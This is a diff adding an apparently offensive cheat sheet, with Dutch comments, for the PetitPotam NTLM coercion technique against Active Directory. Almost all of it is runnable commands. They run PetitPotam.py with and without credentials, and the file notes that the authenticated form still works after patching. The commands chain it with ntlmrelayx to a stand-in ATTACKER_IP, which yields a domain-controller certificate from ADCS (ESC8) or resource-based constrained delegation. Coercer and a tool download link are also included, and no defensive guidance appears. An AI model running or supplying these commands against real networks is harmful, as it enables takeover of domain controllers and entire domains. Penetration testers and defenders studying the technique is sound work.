@@ -1,0 +1,37 @@
+# PetitPotam — MS-EFSR (Encrypting File System Remote) coercion
+# Forceert NTLM authenticatie via het EFS RPC protocol
+# Meest gebruikte coercion techniek voor ADCS relay (ESC8)
+#
+# === Vereisten ===
+# - Netwerk toegang via RPC naar doelwit
+# - Ongepatchte MS-EFSR of authenticated variant
+#
+# === Voorbeelden ===
+
+# Unauthenticated (ongepatchte systemen)
+python3 PetitPotam.py LISTENER_IP DC_IP
+
+# Authenticated (werkt ook na patch)
+python3 PetitPotam.py -u USER -p 'PASS' -d DOMAIN LISTENER_IP DC_IP
+
+# Met specifieke pipe
+python3 PetitPotam.py -u USER -p 'PASS' -d DOMAIN -pipe efsr LISTENER_IP DC_IP
+
+# Combinatie met ntlmrelayx voor ADCS relay (ESC8)
+# Terminal 1:
+python3 ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# Terminal 2:
+python3 PetitPotam.py -u USER -p 'PASS' -d DOMAIN ATTACKER_IP DC_IP
+
+# Combinatie met ntlmrelayx voor RBCD
+# Terminal 1:
+python3 ntlmrelayx.py -t ldaps://DC_IP --delegate-access -smb2support
+# Terminal 2:
+python3 PetitPotam.py -u USER -p 'PASS' -d DOMAIN ATTACKER_IP TARGET_IP
+
+# Coercer - universele coercion tool (alle protocollen)
+python3 Coercer.py coerce -u USER -p 'PASS' -d DOMAIN -l LISTENER_IP -t DC_IP
+
+# Noot: Download: https://github.com/topotam/PetitPotam
+# Noot: MS-patch blokkeert unauthenticated, authenticated werkt nog steeds
+# Noot: Complementair aan DFSCoerce, PrinterBug, ShadowCoerce
